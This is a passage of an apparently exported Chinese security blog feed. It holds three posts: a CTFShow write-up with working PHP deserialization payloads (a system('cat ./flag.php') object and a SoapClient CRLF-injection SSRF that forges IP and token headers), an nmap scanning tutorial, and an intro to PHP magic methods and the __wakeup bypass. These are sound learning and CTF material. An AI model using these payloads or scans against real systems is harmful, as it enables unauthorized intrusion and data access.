class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;cat ./flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;O:&#x27;</span>,<span class="string">&#x27;O:+&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>cookie:<code>O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A25%3A%22system%28%22cat+.%2Fflag.php%22%29%3B%22%3B%7D%7D</code></p><h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xff</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<span class="comment">//explode() 函数把字符串打散为数组。</span></span><br><span class="line">array_pop(<span class="variable">$xff</span>);  <span class="comment">//array_pop() 函数删除数组中的最后一个元素。</span></span><br><span class="line"><span class="variable">$ip</span> = array_pop(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);   <span class="comment">//file_put_contents() 函数把一个字符串写入文件中。</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br></pre></td></tr></table></figure><p>1.某个实例化的类，如果调用了一个不存在的函数会去调用__call魔术方法__call会发送一个请求<br> 2.CRLF \r\n<br> 3.POST数据提交最常用类型Content-Type:<br> application/x-www-form-urlencoded</p><p>通过分析源码，我们可以发现要想得到flag，得需要伪造IP和Token</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$client</span>=<span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1:9999&quot;</span>));</span><br><span class="line"><span class="variable">$client</span>-&gt;getFlag();  <span class="comment">//调用不存在的方法，会自动调用——call()函数来发送请求</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以下是监听得到的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\HP&gt;nc -lvp 9999</span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">connect to [127.0.0.1] from LAPTOP-95PCOPS4 [127.0.0.1] 61662</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:9999</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: PHP-SOAP/5.4.45</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;127.0.0.1#getFlag&quot;</span><br><span class="line">Content-Length: 376</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;127.0.0.1&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:getFlag/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure><p>从上面可以看到， SOAPAction 处是我们的可控参数，UA处也是我们可控的变量，因此我们可以尝试注入我们自己恶意构造的CRLF即插入\r\n</p><p>由此我们构造以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span>=<span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1:9999&quot;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"><span class="variable">$client</span>-&gt;getFlag();  <span class="comment">//调用不存在的方法，会自动调用——call()函数来发送请求</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以下是我们监听的到的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\HP&gt;nc -lvp 9999</span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">connect to [127.0.0.1] from LAPTOP-95PCOPS4 [127.0.0.1] 62473</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:9999</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: ctfshow</span><br><span class="line">x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:13</span><br><span class="line"></span><br><span class="line">token=ctfshow</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;127.0.0.1#getFlag&quot;</span><br><span class="line">Content-Length: 376</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;127.0.0.1&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:getFlag/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure><p>这里token=ctfshow 长度为13 而且为post提交<br> 下方的 因为length限制不会被识别<br> 这里ip因为被pop了两次以，分割所以最后只剩了127.0.0.1<br> 绕过了flag.php<br> 构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span>=<span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;127.0.0.1/&quot;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$client</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A10%3A%22127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A138%3A%22ctfshow%0D%0Ax-forwarded-for%3A127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContentLength%3A13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nmap基本用法</title>
      <link href="/2022/05/13/nmap%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"/>
      <url>/2022/05/13/nmap%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="nmap简介："><a href="#nmap简介：" class="headerlink" title="nmap简介："></a>nmap简介：</h1><p>Nmap （网络映射器）是Gordon Lyon最初编写的一种安全扫描器，用于发现计算机网络上的主机和服务，从而创建网络的“映射”。为了实现其目标，Nmap将特定数据包发送到目标主机，然后分析响应.NMAP强大的网络工具，用于枚举和测试网络。</p><p>NMAP的功能包括：</p><p>· 主机发现 - 识别网络上的主机。例如，列出响应TCP和/或ICMP请求或打开特定端口的主机。</p><p>· 端口扫描 - 枚举目标主机上的开放端口。</p><p>· 版本检测 - 询问远程设备上的网络服务以确定应用程序名称和版本号。</p><p>· OS检测 - 确定网络设备的操作系统和硬件特性。</p><p>· 可与脚本进行脚本交互 - 使用Nmap脚本引擎（NSE）和Lua编程语言。</p><p>NMAP可以提供有关目标的更多信息，包括反向DNS名称，设备类型和MAC地址.Nmap的典型用途：</p><p>· 通过识别可以进行的或通过它的网络连接来审计设备或防火墙的安全性。</p><p>· 识别目标主机上的开放端口以准备审计。</p><p>· 网络库存，网络映射，维护和资产管理。</p><p>· 通过识别新服务器来审计网络的安全性。</p><p>· 为网络上的主机生成流量。</p><h1 id="nmap的基本用法："><a href="#nmap的基本用法：" class="headerlink" title="nmap的基本用法："></a>nmap的基本用法：</h1><table><thead><tr><th align="left">命令</th><th align="left">举例</th><th>解释</th></tr></thead><tbody><tr><td align="left">nmap localhost</td><td align="left">nmap localhost</td><td>查看主机当前开放的端口</td></tr><tr><td align="left">nmap ip地址</td><td align="left">nmap 192.168.13.13</td><td>查看192.168.13.13 的开放端口</td></tr><tr><td align="left"></td><td align="left">nmap 192.168.1.1/24</td><td>扫描整个子网</td></tr><tr><td align="left"></td><td align="left">nmap 192.168.1.2 192.168.1.5</td><td>扫描多个目标</td></tr><tr><td align="left"></td><td align="left">nmap 192.168.1.1-100</td><td>扫描IP地址为192.168.1.1-192.168.1.100内的所有主机</td></tr><tr><td align="left"></td><td align="left">nmap -iL target.txt</td><td>扫描在namp同一目录下target.txt文件内的所有主机</td></tr><tr><td align="left"></td><td align="left">nmap -sL 192.168.1.1/24</td><td>扫描的所有主机的列表</td></tr><tr><td align="left"></td><td align="left">nmap 192.168.1.1/24 -exclude 192.168.1.1</td><td>扫描除了某一个ip外的所有子网主机</td></tr><tr><td align="left"></td><td align="left">nmap 192.168.1.1/24 -exclude file xxx.txt</td><td>xxx.txt中的文件将会从扫描的主机中排除</td></tr><tr><td align="left">nmap -p 端口范围 localhost</td><td align="left">nmap -p 1024-65535 localhost</td><td>查看主机端口（1024-65535）中开放的端口</td></tr><tr><td align="left">nmap -PS ip地址</td><td align="left">nmap -PS 192.168.21.163</td><td>探测目标主机开放的端口</td></tr><tr><td align="left">nmap -PS端口列表</td><td align="left">nmap -PS22,80,3306 192.168.21.163</td><td>探测所列出的目标主机端口</td></tr><tr><td align="left">nmap -O ip地址</td><td align="left">nmap -O 192.168.21.163</td><td>探测目标主机操作系统类型</td></tr><tr><td align="left">nmap -A ip地址</td><td align="left">nmap -A 192.168.21.163</td><td>探测目标主机操作系统类型</td></tr></tbody></table><h2 id="nmap扫描技术"><a href="#nmap扫描技术" class="headerlink" title="nmap扫描技术"></a>nmap扫描技术</h2><p>nmap -sS ip地址</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -<span class="built_in">sS</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>这是一个基本的扫描方式,它被称为<strong>半开放扫描</strong>，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.但是它需要root/administrator权限.</p><p>nmap -sT ip地址</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -<span class="keyword">sT</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>如果不选择SYN扫描,TCP connect()扫描就是<strong>默认的扫描模式</strong>.不同于Tcp SYN扫描,Tcp connect()扫描需要完成<strong>三次握手</strong>,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口.</p><p>nmap -sU ip地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 192.168.1.1</span><br></pre></td></tr></table></figure><p>这种扫描技术用来<strong>寻找目标主机打开的UDP端口</strong>.它<strong>不需要发送任何的SYN包</strong>，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果<strong>返回ICMP不可达</strong>的错误消息，说明<strong>端口是关闭</strong>的，如果<strong>得到正确的适当的回应</strong>，说明<strong>端口是开放</strong>的.</p><p>nmap -sV ip地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.1.1</span><br></pre></td></tr></table></figure><p>版本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口.</p><p>nmap -sL ip地址1 ip地址2</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">nmap</span> -<span class="built_in">sL</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">6</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><p>Idle scan是一种先进的扫描技术，它不是用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包.Idle scan是一种<strong>理想的匿名扫描技术</strong>,通过目标网络中的<strong>192.168.1.6向主机192.168.1.1发送数据，来获取192.168.1.1开放的端口</strong></p><h2 id="Nmap的OS检测（O）"><a href="#Nmap的OS检测（O）" class="headerlink" title="Nmap的OS检测（O）"></a>Nmap的OS检测（O）</h2><p>Nmap最重要的特点之一是能够远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 192.168.1.1</span><br></pre></td></tr></table></figure><p>Nmap的首次发现开放的端口，然后发送数据包发现远程操作系统。操作系统检测参数是O（大写O）</p><h3 id="Nmap的操作系统指纹识别技术："><a href="#Nmap的操作系统指纹识别技术：" class="headerlink" title="Nmap的操作系统指纹识别技术："></a>Nmap的操作系统指纹识别技术：</h3><p>设备类型（路由器，工作组等）<br> 运行（运行的操作系统）<br> 操作系统的详细信息（操作系统的名称和版本）<br> 网络距离（目标和攻击者之间的距离跳）<br> 如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -PN 192.168.1.1/24</span><br></pre></td></tr></table></figure><p><strong>使用-PN参数可以绕过PING命令</strong>,但是不影响主机的系统的发现.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O --osscan_limit <span class="number">192.168</span>.<span class="number">1.1</span></span><br></pre></td></tr></table></figure><p>这种情况是非常不理想的，应该是远程主机做了针对操作系统检测的防范。如果Nmap不能检测到远程操作系统类型，那么就没有必要使用-osscan_limit检测。</p><p>想好通过Nmap准确的检测到远程操作系统是比较困难的，需要使用到Nmap的猜测功能选项, –osscan-guess 猜测认为最接近目标的匹配操作系统类型。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -<span class="number">0</span> --osscan-guess <span class="number">192.168</span>.<span class="number">1.1</span></span><br></pre></td></tr></table></figure><h2 id="nmap常用的扫描"><a href="#nmap常用的扫描" class="headerlink" title="nmap常用的扫描"></a>nmap常用的扫描</h2><p>半开扫描：nmap -sS 192.168.152.130</p><p>全开扫描：nmap -sT 192.168.152.130</p><p>nmap -vv10.1.1.254  其中：-vv =切换以激活日志所需的非常详细的设置</p><p>nmap -p80,443,22,21,8080,25,53 10.1.1.254  端口扫描</p><p>nmap -traceroute 8.8.8.8  跟踪路由</p><h2 id="nmap高级用法"><a href="#nmap高级用法" class="headerlink" title="nmap高级用法"></a>nmap高级用法</h2><h4 id="防火墙扫描"><a href="#防火墙扫描" class="headerlink" title="防火墙扫描"></a>防火墙扫描</h4><p>SYN扫描</p><p>首先可以利用基本的SYN扫描方式探测其端口开放状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T4  -p 网站</span><br></pre></td></tr></table></figure><p>FIN扫描</p><p>然后可以利用FIN扫描方式探测防火墙状态。FIN扫描方式用于识别端口是否关闭，收到RST回复说明该端口关闭，否则说明是open或filtered状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sF -T4 网站</span><br></pre></td></tr></table></figure><p>ACK扫描</p><p>然后利用ACK扫描判断端口是否被过滤。针对ACK探测包，未被过滤的端口（无论打开、关闭）会回复RST包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sA -T4 网站</span><br></pre></td></tr></table></figure><p>Window扫描</p><p>当然也可以利用Window扫描方式，得出一些端口信息，可以与之前扫描分析的结果相互补充。Window扫描方式只对某些TCPIP协议栈才有效</p><p>window扫描原理与ACK类似，发送ACK包探测目标端口，对回复的RST包中的Window size进行解析。在某些TCPIP协议栈实现中，关闭的端口在RST中会将Window size设置为0；而开放的端口将Window size设置成非0的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sW -p- -T4 网站</span><br></pre></td></tr></table></figure><h4 id="扫描互联网"><a href="#扫描互联网" class="headerlink" title="扫描互联网"></a>扫描互联网</h4><p>发现互联网上web服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -iR 100000 -sS -PS80 -p 80 -oG nmap.txt</span><br></pre></td></tr></table></figure><p>随机地产生10万个IP地址，对其80端口进行扫描。将扫描结果以greppable（可用grep命令提取）格式输出到nmap.txt文件。</p><p>优化主机发现<br> <code> map -sP -PE -PP -PS21,22,23,25,80,113,31339-PA80,113,443,10042 –source-port 53 -T4 -iL tcp-allports-1M-IPs</code></p><p>上述命令进行主机发现：使用产生的IP地址（-iL  tcp-allports-1M-IPs），指定发送包的源端口为53（–source-port  53，该端口是DNS查询端口，一般的防火墙都允许来自此端口的数据包），时序级别为4（-T4，探测速度比较快），以TCP  SYN包方式探测目标机的21,22,23,25,80,113,31339端口，以TCP  ACK包方式探测对方80,113,443,10042端口，另外也发送ICMP ECHO/ICMP  TIMESTAMP包探测对方主机。只要上述的探测包中得到一个回复，就可以证明目标主机在线。</p><p>扫描Web站点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 80 -T4 –script http*,defaultscanme.nmap.org</span><br></pre></td></tr></table></figure><p>nmap扫描web站点.png</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2022/05/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/05/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>[[CTFShow-web入门-PHP反序列化]]</p><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介:"></a>简介:</h2><p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p><p>PHP将数据序列化有两个函数：</p><p><strong>serialize</strong> 将对象格式化成有序的字符串。</p><p><strong>unserialize</strong> 将字符串还原成原来的对象。</p><p>序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。</p><h2 id="反序列化的注意事项："><a href="#反序列化的注意事项：" class="headerlink" title="反序列化的注意事项："></a>反序列化的注意事项：</h2><p>将数据进行序列化的操作会自动忽略空格所以进行反序列化之后如果变量前是protected，则会在变量名前加上<code>\x00*\x00</code>,private则会在变量名前加上<code>\x00类名\x00</code>,输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式，输出则会导致不可见字符<code>\x00</code>的丢失。</p><h2 id="反序列化中常见的魔术方法："><a href="#反序列化中常见的魔术方法：" class="headerlink" title="反序列化中常见的魔术方法："></a>反序列化中常见的魔术方法：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__sleep() <span class="comment">//执行serialize()时，先会调用这个函数</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">__invoke() <span class="comment">//当尝试将对象调用为函数时触发</span></span><br><span class="line">__destruct(类执行完毕以后调用，其最主要的作用是拿来做垃圾回收机制。)</span><br><span class="line">__construct(类一执行就开始调用，其作用是拿来初始化一些值。)</span><br><span class="line">__toString(在对象当做字符串的时候会被调用。)</span><br><span class="line">__wakeup(该魔术方法在反序列化的时候自动调用，为反序列化生成的对象做一些初始化操作)</span><br><span class="line">__sleep(在对象被序列化的过程中自动调用。sleep要加数组)</span><br><span class="line">__invoke(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)</span><br><span class="line">__get(当访问类中的私有属性或者是不存在的属性，触发__get魔术方法)</span><br><span class="line">__set(在对象访问私有成员的时候自动被调用，达到了给你看，但是不能给你修改的效果！在对象访问一个私有的成员的时候就会自动的调用该魔术方法)</span><br><span class="line">__call(当所调用的成员方法不存在（或者没有权限）该类时调用，用于对错误后做一些操作或者提示信息)</span><br></pre></td></tr></table></figure><h2 id="反序列化绕过方法："><a href="#反序列化绕过方法：" class="headerlink" title="反序列化绕过方法："></a>反序列化绕过方法：</h2><h3 id="php7-1-反序列化对类属性不敏感"><a href="#php7-1-反序列化对类属性不敏感" class="headerlink" title="php7.1+反序列化对类属性不敏感"></a>php7.1+反序列化对类属性不敏感</h3><p>我们前面说了如果变量前是protected，序列化结果会在变量名前加上<code>\x00*\x00</code>，但在特定版本7.1以上则对于类属性不敏感，</p><h3 id="绕过-wakeup-CVE-2016-7124"><a href="#绕过-wakeup-CVE-2016-7124" class="headerlink" title="绕过__wakeup(CVE-2016-7124)"></a>绕过__wakeup(CVE-2016-7124)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">版本：</span><br><span class="line"></span><br><span class="line">​ PHP5 &lt; 5.6.25</span><br><span class="line"></span><br><span class="line">​ PHP7 &lt; 7.0.10</span><br></pre></td></tr></table></figure><p>利用方式：<code>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</code></p><p>对于下面一个自定义类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span 